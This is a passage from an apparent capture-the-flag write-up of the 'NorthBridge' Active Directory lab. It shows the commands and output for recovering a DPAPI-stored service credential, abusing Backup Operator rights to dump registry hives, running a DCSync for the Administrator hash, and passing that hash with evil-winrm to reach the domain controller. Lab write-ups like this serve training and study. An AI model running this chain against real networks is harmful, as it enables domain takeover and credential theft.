![alt text](https://github.com/Kyd0s/Kyd0s.github.io/blob/main/assets/NorthBridge%20Systems/NorthBridge6.png?raw=true)

and the script ```Invoke-NorthADBackup.ps1``` sets the variable passwordFile as the encrypted file, the script does not specify a key but uses the ```ConvertTo-SecureString```, which uses ```DPAPI``` to encrypt/decrypt the password, like explained [here](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring?view=powershell-7.5)

```bash
# Path to password file
$passwordFile = "C:\Scripts\AD Domain Backup\Password.txt"
$username = "northbridge\_backupsvc"
$backupLocation = "E:\ADBackups"

# Read and convert the password
$securePassword = Get-Content $passwordFile | ConvertTo-SecureString
$cred = New-Object System.Management.Automation.PSCredential ($username, $securePassword)

# Optional: Logon as that user
Start-Process powershell -Credential $cred -ArgumentList {
    # Create the backup folder if it doesn't exist
    if (!(Test-Path -Path $using:backupLocation)) {
        New-Item -Path $using:backupLocation -ItemType Directory
    }

    # Run the backup (AD system state)
    wbadmin start systemstatebackup -backupTarget:$using:backupLocation -quiet
} -Wait
```
With this information and the admin user, we can extract the ```dpapi``` key and decrypt the password in the file.
```bash
┌──(Kyd0s㉿kali)-[~/HackSmarter/NorthBridge]
└─$ nxc smb NORTHJMP01 -u 'GCOOKT1' -k --use-kcache --dpapi                           
SMB         NORTHJMP01      445    NORTHJMP01       [*] Windows Server 2022 Build 20348 x64 (name:NORTHJMP01) (domain:northbridge.corp) (signing:True) (SMBv1:False)
SMB         NORTHJMP01      445    NORTHJMP01       [+] northbridge.corp\GCOOKT1 from ccache (Pwn3d!)
SMB         NORTHJMP01      445    NORTHJMP01       [*] Collecting DPAPI masterkeys, grab a coffee and be patient...
SMB         NORTHJMP01      445    NORTHJMP01       [+] Got 67 decrypted masterkeys. Looting secrets...
SMB         NORTHJMP01      445    NORTHJMP01       [SYSTEM][CREDENTIAL] Domain:batch=TaskScheduler:Task:{749E95F2-638A-4C24-B478-22FB7A4BED13} - NORTHBRIDGE\_backupsvc:************
```
Now we can mark the ```_backupsvc``` used as owned on bloodhound and use its ```Backup Operator```permissions to compromise the domain controller.

```bash
┌──(Kyd0s㉿kali)-[~/HackSmarter/NorthBridge]
└─$ nxc smb NORTHDC01 -u '_backupsvc' -p '************' -M backup_operator
SMB         10.1.151.59     445    NORTHDC01        [*] Windows Server 2022 Build 20348 x64 (name:NORTHDC01) (domain:northbridge.corp) (signing:True) (SMBv1:False)
SMB         10.1.151.59     445    NORTHDC01        [+] northbridge.corp\_backupsvc:************ 
BACKUP_O... 10.1.151.59     445    NORTHDC01        [*] Triggering RemoteRegistry to start through named pipe...
BACKUP_O... 10.1.151.59     445    NORTHDC01        Saved HKLM\SAM to \\10.1.151.59\SYSVOL\SAM
BACKUP_O... 10.1.151.59     445    NORTHDC01        Saved HKLM\SYSTEM to \\10.1.151.59\SYSVOL\SYSTEM
BACKUP_O... 10.1.151.59     445    NORTHDC01        Saved HKLM\SECURITY to \\10.1.151.59\SYSVOL\SECURITY
SMB         10.1.151.59     445    NORTHDC01        [*] Copying "SAM" to "/home/Kyd0s/.nxc/logs/NORTHDC01_10.1.151.59_2026-01-12_210928.SAM"
SMB         10.1.151.59     445    NORTHDC01        [+] File "SAM" was downloaded to "/home/Kyd0s/.nxc/logs/NORTHDC01_10.1.151.59_2026-01-12_210928.SAM"
SMB         10.1.151.59     445    NORTHDC01        [*] Copying "SECURITY" to "/home/Kyd0s/.nxc/logs/NORTHDC01_10.1.151.59_2026-01-12_210928.SECURITY"
SMB         10.1.151.59     445    NORTHDC01        [+] File "SECURITY" was downloaded to "/home/Kyd0s/.nxc/logs/NORTHDC01_10.1.151.59_2026-01-12_210928.SECURITY"
SMB         10.1.151.59     445    NORTHDC01        [*] Copying "SYSTEM" to "/home/Kyd0s/.nxc/logs/NORTHDC01_10.1.151.59_2026-01-12_210928.SYSTEM"
SMB         10.1.151.59     445    NORTHDC01        [+] File "SYSTEM" was downloaded to "/home/Kyd0s/.nxc/logs/NORTHDC01_10.1.151.59_2026-01-12_210928.SYSTEM"
BACKUP_O... 10.1.151.59     445    NORTHDC01        Administrator:500:aad3b435b51404eeaad3b435b51404ee:***********************************************:::                                                                                                              
BACKUP_O... 10.1.151.59     445    NORTHDC01        Guest:501:aad3b435b51404eeaad3b435b51404ee:***********************************************:::                                                                                                                      
BACKUP_O... 10.1.151.59     445    NORTHDC01        DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:***********************************************:::                                                                                                             
BACKUP_O... 10.1.151.59     445    NORTHDC01        $MACHINE.ACC:plain_password_hex:fdb7ad46ecb6b8a9e4aecf47aa805225593e6800b6a41e1688109c826ec492e91c3c4f3cd11e0e4d08a26f2f0dabdd417878d222c78e542f85ba80a21028c5e4b80108221cc8f45c6d8f26453bc0da**********************************************************************************************************************************************5b6d655ad14f8413c326dd78b756eb6a4d794a58526310afdcf1df856eeb1ebb8e156dd65547bb9b41a4861f4d5ae1f8432f4a8695f168c020a7991dcefc5c7db1b62f83375ddf3cc82629a8b24070f329e4c0406bef36dc346345182093e                                                        
BACKUP_O... 10.1.151.59     445    NORTHDC01        $MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:***********************************************                                                                                                                     
BACKUP_O... 10.1.151.59     445    NORTHDC01        dpapi_machinekey:***********************************************
dpapi_userkey:***********************************************
BACKUP_O... 10.1.151.59     445    NORTHDC01        NL$KM:b696c77e178a0cdd8c39c20aa2912444a2e44dc2095946c07f95ea11cb7fcb72ec***********************************************                                                              
SMB         10.1.151.59     445    NORTHDC01        [-] northbridge.corp\Administrator:1e810164bd53c3e4e91872ff347bd808 STATUS_LOGON_FAILURE
BACKUP_O... 10.1.151.59     445    NORTHDC01        [*] Use the domain admin account to clean the file on the remote host
BACKUP_O... 10.1.151.59     445    NORTHDC01        [*] netexec smb dc_ip -u user -p pass -x "del C:\Windows\sysvol\sysvol\SECURITY && del C:\Windows\sysvol\sysvol\SAM && del C:\Windows\sysvol\sysvol\SYSTEM"
```
From here we use the NTLM hash of the machine for the next step
![alt text](https://github.com/Kyd0s/Kyd0s.github.io/blob/main/assets/NorthBridge%20Systems/NorthBridge7.png?raw=true)
![alt text](https://github.com/Kyd0s/Kyd0s.github.io/blob/main/assets/NorthBridge%20Systems/NorthBridge8.png?raw=true)

First we use the ```NTLM``` hash of the machine to request the ```NTLM``` of the Administrator
```bash
┌──(Kyd0s㉿kali)-[~/HackSmarter/NorthBridge]
└─$ impacket-secretsdump 'northbridge.corp/NORTHDC01$@NORTHDC01.northbridge.corp' -hashes :***************************** -just-dc-user Administrator
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:*****************************:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:*****************************
Administrator:aes128-cts-hmac-sha1-96:7*****************************
Administrator:des-cbc-md5:*****************************
[*] Cleaning up... 

```
We check that we have owned the DC, and collect the flag with Evil-WinRM

```bash
┌──(Kyd0s㉿kali)-[~/HackSmarter/NorthBridge]
└─$ nxc smb NORTHDC01 -u 'Administrator' -H '*****************************'
SMB         10.1.151.59     445    NORTHDC01        [*] Windows Server 2022 Build 20348 x64 (name:NORTHDC01) (domain:northbridge.corp) (signing:True) (SMBv1:False)
SMB         10.1.151.59     445    NORTHDC01        [+] northbridge.corp\Administrator:8b61f9dfb32c8209f4ac9e2a5c2269cc (Pwn3d!)     

┌──(Kyd0s㉿kali)-[~/HackSmarter/NorthBridge]
└─$ evil-winrm -i NORTHDC01 -u Administrator -H '*****************************'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                                        
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 

*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\root.txt
Hey!

Nicely done making it all the way to compromising the Northbridge Systems domain controller!

This was the first CTF environment I have built so I hope you enjoyed it (and that it wasn't too frustrating!). It is based on a recent engagement I was on and tried to include some of the same "gotchas" we encountered such as MAQ being set to 0 and tier-zero accounts protected from Kerberos delegation.

Thanks for taking the time to complete the challenge. I really appreciate it!

- InfoSecGray

FLAG{*****************************}
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```
Now that we own the system, we can collect root flag :)

Enjoy!
